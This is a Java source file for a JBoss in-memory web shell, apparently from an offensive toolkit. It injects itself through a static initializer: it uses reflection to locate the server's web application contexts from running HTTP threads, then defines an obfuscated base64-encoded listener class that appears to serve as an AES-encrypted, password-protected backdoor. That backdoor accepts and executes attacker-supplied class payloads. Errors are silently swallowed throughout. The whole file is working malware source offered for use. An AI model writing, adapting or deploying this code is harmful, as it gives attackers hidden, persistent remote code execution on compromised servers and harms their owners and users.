package core.memshell;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class JBossListenerMemShell {
    private static ArrayList StanderContexts = new ArrayList();
    static {
        Inject();
    }

    public JBossListenerMemShell() {

        Inject();
    }




    public static synchronized void Inject() {
        getContext1();
        getContext();
        Iterator var1 = StanderContexts.iterator();
        while (var1.hasNext()) {
            Object var2 = var1.next();
            IMF(var2);
        }
    }

    public static synchronized void getContext1() {
        ArrayList var0 = new ArrayList();
        Object StandardContext = null;
        try {
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Thread[] threads = (Thread[]) getFV(threadGroup, "threads");
            for (Thread thread : threads) {
                if (thread.getName().startsWith("http-")) {
                    Object Endpoint = null;

                    Object tmp =  getFV(thread, "target");
                    if (tmp.getClass().getName().contains("PoolTcpEndpoint")){
                        Endpoint = tmp;
                    }
                    else{
                        Endpoint = getFV(tmp, "endpoint");
                    }
                    Object Http11Protocol = getFV(Endpoint, "handler");
                    Object RequestGroupInof = getFV(Http11Protocol, "global");
                    List Processors = (List) getFV(RequestGroupInof, "processors");
                    for (int i = 0; i < Processors.size(); i++) {
                        Object RequestInfo = (Object) Processors.get(i);
                        Object Request = getFV(RequestInfo, "req");
                        Object Request1 = Request.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(Request, 1);
                        Field f4 = Request1.getClass().getDeclaredField("context");
                        f4.setAccessible(true);
                        StandardContext = f4.get(Request1);
                        if (StandardContext != null) {
                            StanderContexts.add(StandardContext);
                            break;
                        }
                    }
                }
            }

        }catch(Exception e){}

    }

    public static synchronized void getContext() {
        Object StandardContext = null;
        try {
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Thread[] threads = (Thread[]) getFV(threadGroup, "threads");
            for (Thread thread : threads) {
                if (thread.getName().contains("Acceptor") && thread.getName().contains("http")) {
                    Object JioEndpoint$ = getFV(thread, "target");
                    Object JioEndpointO = getFV(JioEndpoint$, "this$0");
                    Object Http11Protocol = getFV(JioEndpointO, "handler");
                    Object RequestGroupInof = getFV(Http11Protocol, "global");
                    List Processors = (List) getFV(RequestGroupInof, "processors");
                    for (int i = 0; i < Processors.size(); i++) {
                        Object RequestInfo = (Object) Processors.get(i);
                        Object Request = getFV(RequestInfo, "req");
                        Object Request1 = Request.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(Request, 1);
                        Field f4 = Request1.getClass().getDeclaredField("context");
                        f4.setAccessible(true);
                        StandardContext = f4.get(Request1);
                        if (StandardContext != null) {
                            StanderContexts.add(StandardContext);
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) {

        }
    }

    public static synchronized void IMF(Object var1) {
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            String ListenerBase64 = "yv66vgAAADIBZgoAYwC1CQBJALYJAEkAtwgAuAkASQC5CAC6CQBJALsIALwJAEkAvQcAvgoACgC1CgAKAL8KAAoAwAoASQDBCQBJAMIIAMMJAEkAxAoAYwDFCgBjAMYIAMcKAMgAyQcAygoAMQDLCgAWAMwKAMgAzQoAyADOBwDPCADQCgDRANIKADEA0woA0QDUBwDVCgDRANYKACAA1woAIADYCgAxANkIANoKAC4A2wgA3AcA3QoALgDeBwDfCgDgAOEKADAA4ggA4wcA5AcAfAcA5QcA5ggA5woALgDoCADpCADqCADrCADsCADtCQDuAO8IAPAKAPEA8goA8wD0BwD1CgBJAPYIAPcLAD0A+AgA+QoAMQD6CwA9APsLAD0A/AoASQD9CgBJAP4IAP8LAQABAQcBAgoALgEDCgBJAMUKAEkBBAsBAAEFCAEGCwA9AQUHAQcKAFAAtQoAMAEICwBhAQkKADEBCgoBCwEMCgAwAMAKAFABDQoASQEOCgAxAQ8IARAIAREKABsBEggAZwoALgETCgEUARUKARQBFgcBFwgAZQcBGAcBGQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAdTG1lbXNoZWxsL0pCb3NzTGlzdGVuZXJTaGVsbDsBABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAXoBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAAVEBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAJjYgEAAltCAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAEdmFyNAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAXMBAAFtAQABWgEADVN0YWNrTWFwVGFibGUHAQIHARoHAM8BACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAHUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQADcmV0BwDmAQAMYmFzZTY0RW5jb2RlAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAB0VuY29kZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAZiYXNlNjQBABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjYBAAJicwEABXZhbHVlAQAKRXhjZXB0aW9ucwEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQADcmVxAQAjTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDsBABJyZXF1ZXN0SW5pdGlhbGl6ZWQBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAR2YXI5BwEbBwD1BwEXBwEcAQAWZ2V0UmVzcG9uc2VGcm9tUmVxdWVzdAEAUShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABHZhcjMBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEdmFyNQEABHZhcjgBAAR2YXIxAQAEdmFyMgEAClNvdXJjZUZpbGUBABdKQm9zc0xpc3RlbmVyU2hlbGwuamF2YQwAbwBwDABlAGYMAGcAaAEAEDNjNmUwYjhhOWMxNTIyNGEMAGkAagEABHBBUzMMAGsAagEAEC9mYXZpY29uZGVtby5pY28MAGwAagEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEdAR4MAR8BIAwAbQCKDABtAGoBAAVVVEYtOAwAbgBqDABvAHYMASEBIgEAA0FFUwcBGgwBIwEkAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBJQEmDABvAScMASgBKQwBKgErAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAA01ENQcBLAwBIwEtDAEuAS8MATABMQEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAEyASYMAG8BMwwBHwE0DAE1ASABABBqYXZhLnV0aWwuQmFzZTY0DAE2ATcBAApnZXRFbmNvZGVyAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAE4ATkBABNbTGphdmEvbGFuZy9PYmplY3Q7BwE6DAE7ATwMAT0BPgEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAE/AUABAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgcBQQwBQgFDAQAESW5pdAcBRAwBRQFGBwEbDAFHAUgBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DACrAKwBABBYLVJlcXVlc3RlZC1XaXRoDAFJAIoBAA5YTUxIVFRQUmVxdWVzdAwBSgFLDAFMAU0MAU4AigwAmACZDAB9AH4BAAdwYXlsb2FkBwEcDAFPAVABABttZW1zaGVsbC9KQm9zc0xpc3RlbmVyU2hlbGwMAVEBUgwAeQB6DAFTAVQBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAVUBVgwBVwFYDAFZAVoHAVsMAVwBRgwBXQEmDACOAI8MAVkBNAEADlhtbEhUVFBSZXF1ZXN0AQAHU3VjY2VzcwwBXgBwDAFfAWAHAWEMAWIBYwwBZAFlAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBAAt0b0J5dGVBcnJheQEAD3ByaW50U3RhY2tUcmFjZQEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsAIQBJAGMAAQBkAAcAAQBlAGYAAAABAGcAaAAAAAAAaQBqAAAAAQBrAGoAAAABAGwAagAAAAAAbQBqAAAAAQBuAGoAAAAKAAEAbwBwAAEAcQAAAJAAAwABAAAARiq3AAEqAbUAAioBtQADKhIEtQAFKhIGtQAHKhIItQAJKrsAClm3AAsqtAAHtgAMKrQABbYADLYADbgADrUADyoSELUAEbEAAAACAHIAAAAmAAkAAAAZAAQAEQAJABIADgATABQAFAAaABUAIAAaAD8AGwBFABwAcwAAAAwAAQAAAEYAdAB1AAAAAQBvAHYAAQBxAAAAmwADAAIAAABHKiu3ABIqAbUAAioBtQADKhIE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";
            byte[] ListenerClass = base64Decode(ListenerBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);

            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);

            Object listenerObject = (Object) listenerClass.newInstance();
            Method m1 = var1.getClass().getDeclaredMethod("getApplicationEventListeners");
            m1.setAccessible(true);
            Object[] al = (Object[]) m1.invoke(var1);
            Object[] tempArr = new Object[al.length + 1];
            System.arraycopy(al, 0, tempArr, 0, al.length);
            tempArr[al.length] = listenerObject;
            Method m2 = var1.getClass().getDeclaredMethod("setApplicationEventListeners", Object[].class);
            m2.setAccessible(true);
            m2.invoke(var1, new Object[]{tempArr});
        } catch (Exception e) {
        }
    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }
}
